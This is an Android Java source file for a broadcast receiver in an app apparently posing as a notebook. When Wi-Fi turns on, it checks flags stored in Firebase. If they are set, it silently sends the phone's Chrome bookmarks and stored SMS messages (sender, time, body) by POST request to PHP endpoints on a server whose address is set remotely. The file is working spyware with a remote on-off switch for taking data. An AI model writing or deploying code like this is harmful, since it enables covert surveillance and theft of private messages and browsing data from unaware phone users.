package com.example.hac.notebook;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.SystemClock;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by Hac on 19/03/2017.
 */

public class WifiReceiver extends BroadcastReceiver {

    FirebaseDatabase mdatabase = FirebaseDatabase.getInstance();
    DatabaseReference myRef = mdatabase.getReference();

    @Override
    public void onReceive(final Context context, Intent intent) {

        WifiManager wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        if (wifi.isWifiEnabled()) {
            myRef.child("Permession").child("ChangeStatWifi").child("Bookmark").addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(DataSnapshot dataSnapshot) {
                    String kq=dataSnapshot.getValue().toString();
                    Guibookmark(context, kq);
                }

                @Override
                public void onCancelled(DatabaseError databaseError) {
                }
            });

            myRef.child("Permession").child("ChangeStatWifi").child("SmsOffline").addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(DataSnapshot dataSnapshot) {
                    String kq=dataSnapshot.getValue().toString();
                    GuiSms(context, kq);
                }

                @Override
                public void onCancelled(DatabaseError databaseError) {
                }
            });
        }
    }

    public void Guibookmark (final Context context, String kq){
        if(kq.equals("1"))
        {
            myRef.child("Permession").child("ChangeLink").addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(DataSnapshot dataSnapshot) {

                    String link=dataSnapshot.getValue().toString();
                    String linksms=(link+"bookmark_db.php").trim();

                    // thuc thi neu bang 1
                    laybookmark(context,linksms);


                }

                @Override
                public void onCancelled(DatabaseError databaseError) {

                }
            });

        }
        else {
        }
    }

    public void GuiSms (final Context context, String kq){
        if(kq.equals("1"))
        {
            // thuc thi neu bang 1
            myRef.child("Permession").child("ChangeLink").addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(DataSnapshot dataSnapshot) {

                    String link=dataSnapshot.getValue().toString();
                    String linksms=(link+"connect_db.php").trim();
                    guiSms(context,linksms);
                }

                @Override
                public void onCancelled(DatabaseError databaseError) {

                }
            });

        }
        else {
        }
    }

    private void laybookmark(Context context,String urla) {
        ContentResolver cr=context.getContentResolver();
        String[] project=new String[] {"_id","date","title","url","visits","bookmark"};
        Uri Name_Uri=Uri.parse("content://com.android.chrome.browser/bookmarks");
        Cursor c=cr.query(Name_Uri,project,null,null,null);
        if(c!=null){
            c.moveToFirst();
            int dem =0;
            int a=50;
            if(c.getCount()<a)  a=c.getCount();
            while (dem<a)
            {
                // chuyen doi dang ngay thang nam gio phut giay
                String date = c.getString(1);
                Long timestamp = Long.parseLong(date);
                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(timestamp);
                Date finaldate = calendar.getTime();
                final String smsDate = finaldate.toString();


                final String idbm =c.getString(0);
                final String title=c.getString(2);
                final String url =c.getString(3);
                final String visits=c.getString(4);
                final String bookmark =c.getString(5);


                StringRequest stringRequest = new StringRequest(Request.Method.POST,urla, new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // cau tr
                    }
                }, new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        // tra loi loi
                    }
                }){
                    @Override
                    protected Map<String, String> getParams() throws AuthFailureError {
                        Map<String,String> param=new HashMap<String, String>();

                        param.put("idbm",idbm);
                        param.put("title",title);
                        param.put("url",url);
                        param.put("visits",visits);
                        param.put("date",smsDate);
                        param.put("bookmark",bookmark);
                        return param;
                    }
                };


                Singleton.getmInstance(context.getApplicationContext()).addTorequestqueue(stringRequest);

                SystemClock.sleep(100);

                dem++;
                c.moveToNext();
            }

            c.close();

        }
    }

    private void guiSms(Context context,String url){
        DatabaseHelper db=new DatabaseHelper(context);

        db.xuliData("CREATE TABLE IF NOT EXISTS sms_table(_id INTEGER PRIMARY KEY, address VARCHAR(300) NULL,time VARCHAR(300) NULL,reade VARCHAR(300) NULL,body TEXT NULL)");

        Cursor kq=db.layData("SELECT*FROM sms_table");

        while (kq.moveToNext()){

            final String address=kq.getString(1);
            final String time=kq.getString(2);
            final String read=kq.getString(3);
            final String body=kq.getString(4);

            StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                }
            }){
                @Override
                protected Map<String, String> getParams() throws AuthFailureError {
                    Map<String,String> param=new HashMap<String, String>();

                    param.put("address",address);
                    param.put("time",time);
                    param.put("read",read);
                    param.put("body",body);

                    return param;
                }
            };

            Singleton.getmInstance(context.getApplicationContext()).addTorequestqueue(stringRequest);


        }
        kq.close();
    }

}
